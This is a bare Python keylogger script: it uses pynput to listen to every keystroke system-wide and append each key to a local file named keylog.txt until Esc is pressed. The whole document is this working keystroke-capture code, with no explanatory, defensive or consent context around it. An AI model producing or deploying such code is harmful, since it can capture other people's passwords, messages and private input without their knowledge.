from pynput import keyboard
def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f' {key} ')

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()